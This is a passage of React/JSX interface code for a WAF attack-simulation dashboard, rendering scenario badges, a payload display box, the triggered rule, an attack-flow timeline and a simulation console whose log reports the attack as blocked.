                    <div style={{ fontSize: '16px', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '4px' }}>{selected.name}</div>
                    <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
                      <span className={`badge badge-${selected.severity}`}>{selected.severity.toUpperCase()}</span>
                      <span className="badge badge-neutral">{selected.category}</span>
                      <span className="badge badge-info">{selected.useCaseTag}</span>
                      <span className={`badge ${selected.expectedAction === 'BLOCK' ? 'badge-critical' : 'badge-warning'}`}>Expected: {selected.expectedAction}</span>
                    </div>
                  </div>
                </div>

                {/* Payload */}
                <div style={{ background: 'var(--bg-primary)', padding: '12px 14px', borderRadius: 'var(--radius-md)', marginBottom: '14px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '6px' }}>Simulated Payload</div>
                  <code className="font-mono" style={{ fontSize: '11px', color: 'var(--status-critical)', wordBreak: 'break-all', lineHeight: 1.6 }}>
                    {selected.payload}
                  </code>
                </div>

                {/* WAF Rule matched */}
                <div style={{ background: 'var(--surface-1)', padding: '10px 14px', borderRadius: 'var(--radius-md)', marginBottom: '14px' }}>
                  <div style={{ fontSize: '10px', color: 'var(--text-muted)', fontWeight: 600, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '4px' }}>WAF Rule Triggered</div>
                  <code className="font-mono" style={{ fontSize: '12px', color: 'var(--status-info)' }}>{selected.wafRule}</code>
                </div>

                {/* Steps */}
                <div>
                  <div style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '10px' }}>Attack Flow</div>
                  <div className="timeline">
                    {selected.steps.map((s, i) => {
                      const isActive = i < step
                      const isRunning = i === step - 1 && running
                      return (
                        <div key={i} className="timeline-item">
                          <div className="timeline-dot" style={{
                            background: isActive ? (i === selected.steps.length - 1 ? 'var(--status-success-bg)' : 'var(--status-critical-bg)') : 'var(--surface-2)',
                            color: isActive ? (i === selected.steps.length - 1 ? 'var(--status-success)' : 'var(--status-critical)') : 'var(--text-muted)',
                            fontSize: '11px',
                          }}>
                            {isRunning ? '⟳' : isActive ? (i === selected.steps.length - 1 ? '✓' : '!') : i + 1}
                          </div>
                          <div className="timeline-content" style={{ paddingTop: '4px' }}>
                            <div className="timeline-text" style={{ color: isActive ? 'var(--text-primary)' : 'var(--text-muted)', transition: 'color 0.3s' }}>
                              {s}
                            </div>
                          </div>
                        </div>
                      )
                    })}
                  </div>
                </div>
              </div>
            ) : null}

            {/* Console log */}
            <div className="card" style={{ padding: 0, overflow: 'hidden' }}>
              <div style={{
                padding: '12px 16px', borderBottom: '1px solid var(--border-subtle)',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                background: 'var(--surface-1)',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                  <span style={{ display: 'flex', gap: '5px' }}>
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ffbd2e' }} />
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#27c93f' }} />
                  </span>
                  <span className="font-mono" style={{ fontSize: '12px', color: 'var(--text-muted)' }}>
                    waf-sim ~ simulation console
                  </span>
                  {running && <span style={{ fontSize: '10px', color: 'var(--status-success)', display: 'flex', alignItems: 'center', gap: 4 }}><span className="status-dot" style={{ width: 5, height: 5 }} />RUNNING</span>}
                </div>
                <div style={{ display: 'flex', gap: '8px' }}>
                  {selected && !running && (
                    <button
                      id="run-sim-btn"
                      className="btn btn-primary btn-sm"
                      onClick={runSimulation}
                      disabled={!selected}
                    >
                      ▶ Run Simulation
                    </button>
                  )}
                  {(running || logs.length > 0) && (
                    <button id="reset-sim-btn" className="btn btn-ghost btn-sm" onClick={resetSim}>
                      ↺ Reset
                    </button>
                  )}
                </div>
              </div>

              <div style={{
                background: '#050810',
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                padding: '14px',
                height: '240px',
                overflowY: 'auto',
                display: 'flex',
                flexDirection: 'column',
                gap: '4px',
              }}>
                {logs.length === 0 ? (
                  <span style={{ color: 'var(--text-muted)', opacity: 0.5 }}>
                    {selected
                      ? '$ Ready. Press "Run Simulation" to start.'
                      : '$ Select a scenario to begin...'}
                  </span>
                ) : logs.map((log, i) => (
                  <div key={i} style={{ display: 'flex', gap: '10px' }}>
                    <span style={{ color: 'var(--text-muted)', flexShrink: 0 }}>{log.ts}</span>
                    <span style={{ color: logColor[log.type], flexShrink: 0 }}>{logPrefix[log.type]}</span>
                    <span style={{ color: log.type === 'success' ? 'var(--status-success)' : log.type === 'critical' ? 'var(--status-critical)' : 'var(--text-secondary)' }}>
                      {log.msg}
                    </span>
                  </div>
                ))}
                {done && (
                  <div style={{ marginTop: '8px', padding: '8px', background: 'rgba(0,214,143,0.08)', borderRadius: '4px', color: 'var(--status-success)' }}>
                    ✓ Simulation complete. AWS WAF successfully blocked the attack.
                  </div>
                )}
                <div ref={logsEndRef} />
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  )
}
